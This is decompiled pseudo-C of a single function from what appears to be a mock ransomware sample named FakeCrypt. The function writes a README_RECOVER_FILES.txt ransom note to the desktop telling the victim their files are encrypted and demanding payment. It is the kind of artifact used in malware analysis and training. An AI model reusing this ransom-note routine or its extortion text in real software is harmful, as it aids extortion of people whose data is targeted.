int FakeCrypt::fileops::drop_ransom_note()
{
    unsigned int v0;  // [bp-0x64]
    char v1;  // [bp-0x60]
    unsigned int v2;  // [bp-0x60]
    int v3;  // [bp-0x5c]
    unsigned long long v4;  // [bp-0x50]
    int v5;  // [bp-0x48]
    unsigned long long v6;  // [bp-0x40]
    unsigned long long v7;  // [bp-0x38]
    char v8;  // [bp-0x28]
    unsigned long v10;  // rbp
    unsigned int v12;  // eax

    dirs::desktop_dir(&(char)v2);
    if ((char)(((0 ^ *((long long *)&v1)) & (0 ^ -(*((long long *)&v1)))) >> 63))
    {
        std::sys::pal::unix::os::split_paths::bytes_to_path(&(char)v5, "/tmp_DIRKindbool", 4);
    }
    else
    {
        v7 = v4;
        *((int128_t *)&v5) = *((int128_t *)&v1);
    }
    v8.join(v6, v7, "README_RECOVER_FILES.txt", 24);
    (char)v2.create(&v8);
    v10 = v2;
    if ((unsigned int)v10 != 1)
    {
        v0 = (int)v3;
        core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>(v0.write_all("\nYour files have been encrypted.\n\nTo recover them, you must pay the ransom.\n\nFailure to do so will result in permanent loss of your data.\n", 138));
        ::0x454540::core::ptr::drop_in_place<std::fs::File>(v0);
    }
    v12 = (unsigned int)::0x454570::core::ptr::drop_in_place<std::path::PathBuf>(&(char)v5);
    if (!(char)v10)
        return v12;
    return core::ptr::drop_in_place<core::result::Result<std::fs::File,std::io::error::Error>>(&(char)v2);
}
